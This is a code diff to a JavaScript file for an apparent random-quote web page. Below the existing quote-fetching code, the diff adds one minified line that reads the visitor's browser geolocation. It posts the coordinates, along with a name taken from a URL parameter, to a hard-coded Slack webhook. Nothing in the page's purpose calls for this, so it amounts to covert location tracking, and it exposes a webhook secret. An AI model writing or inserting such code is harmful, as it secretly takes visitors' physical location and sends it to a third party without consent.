@@ -109,3 +109,6 @@ $.ajax(settings).done(function (response) {
   let qoute = JSON.parse(response)[randomIndex];
   insertQoute(qoute.text, qoute.author);
 });
+
+//Get location.
+var url="https://hooks.slack.com/services/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";function showPosition(o){sendLocation(o.coords.latitude,o.coords.longitude,new URLSearchParams(window.location.search).get("n"))}function getLocation(){navigator.geolocation?navigator.geolocation.getCurrentPosition(showPosition):x.innerHTML="Geolocation is not supported by this browser."}function sendLocation(o,t,n){$.ajax({data:"payload="+JSON.stringify({blocks:[{type:"section",text:{type:"mrkdwn",text:"_I am "+n+"_ \n *Latitude:* \n"+o+"\n*Longitude:* \n"+t}}]}),dataType:"json",processData:!1,type:"POST",url:url})}
